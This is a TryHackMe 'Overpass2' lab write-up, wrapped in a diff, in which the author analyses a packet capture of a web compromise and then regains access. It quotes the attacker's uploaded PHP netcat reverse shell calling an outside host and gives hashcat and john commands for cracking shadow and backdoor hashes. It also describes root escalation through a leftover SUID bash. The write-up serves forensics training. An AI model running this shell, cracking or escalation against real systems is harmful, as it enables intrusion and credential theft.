@@ -1,0 +1,94 @@
+I"�<h1 id="tryhackme---overpass2">TryHackMe - Overpass2</h1>
+<hr />
+
+<p>This room is more a forensics room. The story is that someone has hacked the overpass website and we need to investigate how the attacker got in, what they did, and how we can get back on the box. We’ll be using wireshark and some OSINT to figure out how the attacker got on and we’ll see if we can’t get back on the box. BTW, there is a walkthrough vide of this room by John Hammond, he’s an excellent cyber-security resource on youtube so check him out if that’s your thing.</p>
+
+<h2 id="analyse-the-pcap">analyse the PCAP</h2>
+
+<p>The first section of this room is to analyse the wireshark packet capture file and see what the attacker did. We’ll figure out where they uploaded, what they uploaded, and all the commands that the attacker used on the box. The first place to start with the packet capture file is <code class="language-plaintext highlighter-rouge">http POST</code> requests. Naviagting the file in wireshark and searching for <code class="language-plaintext highlighter-rouge">http</code>, we can see a <code class="language-plaintext highlighter-rouge">POST</code> request made to the <code class="language-plaintext highlighter-rouge">/development/</code> directory. This is a good place to look. If we inspect the request we can also see the reverse shell that got uploaded.
+<br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /development/upload.php HTTP/1.1
+Host: 192.168.170.159
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.170.159/development/
+Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
+Content-Length: 454
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1809049028579987031515260006
+Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
+Content-Type: application/x-php
+
+&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f")?&gt;
+
+-----------------------------1809049028579987031515260006
+Content-Disposition: form-data; name="submit"
+
+Upload File
+-----------------------------1809049028579987031515260006--
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<p>You can see the php code that gave the attacker the reverse shell. Now that we know the packet where the attacker uploaded his shell, we can simply inspect the packets beneath that until we see some shell commands. Netcat reverse shells transmit in clear text. The first command we see is to stabilize the shell. Once we locate that packet we can get a good overview of what the attacker did by going to analyze -&gt; follow -&gt; tcp stream. This allows us to see exactly what commands the attacker used.
+<br />
+<br /></p>
+
+<p><img src="assets/images/overpass2/overpass2_tcpfollow.png" alt="" />
+<br />
+<br /></p>
+
+<p>The attacker grabbed the user <code class="language-plaintext highlighter-rouge">james</code> password and switched to that user. From there, they dumped the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file. The room would like for us to take the shadow file and see how many of the passwords are crackable with the <code class="language-plaintext highlighter-rouge">fasttrack.txt</code> wordlist. You can use <code class="language-plaintext highlighter-rouge">hashcat</code> or <code class="language-plaintext highlighter-rouge">john</code> for this. If you use <code class="language-plaintext highlighter-rouge">john</code>, this is what I used:
+<br />
+<br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo john hashes.txt --wordlist=/usr/share/wordlists/fasttrack.txt</code>
+<br />
+<br /></p>
+
+<p>The last part of this analysis is the program that the attacker used to install a backdoor on the machine. We can see that they cloned a git repo named <code class="language-plaintext highlighter-rouge">ssh-backdoor</code>. The next section is all about figuring out what the backdoor does.</p>
+
+<h2 id="analysis-of-the-backdoor">analysis of the backdoor</h2>
+
+<p>Going to the git repo with the backdoor script <a href="https://github.com/NinjaJc01/ssh-backdoor">here</a>, we see only a couple of scripts, but the main one is, aptly named <code class="language-plaintext highlighter-rouge">main.go</code>. We can see that there’s a default hash and a hardcoded salt involved in the code, but the attacker actually used their own hash. We can investigate the PCAP file again to see what the attacker used as their hash. So, with the hash and the salt, we can construct a hash that can be cracked. For this one, I used hashcat. The basic construction of the hash is <code class="language-plaintext highlighter-rouge">hash:salt</code>. I saved the hash in a file named <code class="language-plaintext highlighter-rouge">attacker_hash</code>, and the command I used is:
+<br />
+<br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">hashcat -m 1710 attacker_hash.txt /usr/share/wordlists/rockyou.txt</code>
+<br />
+<br /></p>
+
+<h2 id="back-to-the-machine">back to the machine</h2>
+
+<p>Once we get that password cracked, we can connect to the victim machine through the backdoor the attacker installed. Once on the machine, we can grab the user flag with ease.
+<br />
+<br /></p>
+
+<p><img src="assets/images/overpass2/overpass2_user.png" alt="" />
+<br />
+<br /></p>
+
+<h2 id="root-escalation">root escalation</h2>
+
+<p>The escalation here is easy. The attacker left a quick way to escalate. After trying to run <code class="language-plaintext highlighter-rouge">sudo -l</code> with <code class="language-plaintext highlighter-rouge">james</code> password and failing, I took a look at the files in the home folder for <code class="language-plaintext highlighter-rouge">james</code> and saw a <code class="language-plaintext highlighter-rouge">.suid_bash</code> file owned by root. We can run this file with the <code class="language-plaintext highlighter-rouge">-p</code> argument to keep the permissions of the file owner and that allows us to get a shell as root.
+<br />
+<br /></p>
+
+<p><img src="assets/images/overpass2/overpass2_setuid.png" alt="" />
+<br />
+<br /></p>
+
+<p><img src="assets/images/overpass2/overpass2_root.png" alt="" />
+<br />
+<br /></p>
+
+<p>From there root is only a <code class="language-plaintext highlighter-rouge">cat</code> command away. This was a great box that gave me a chance to refresh myself on wireshark and researching some code. Thanks for reading if you’ve gotten this far, and a special thanks to the creator of this box!
+<br />
+<br /></p>
+:ET
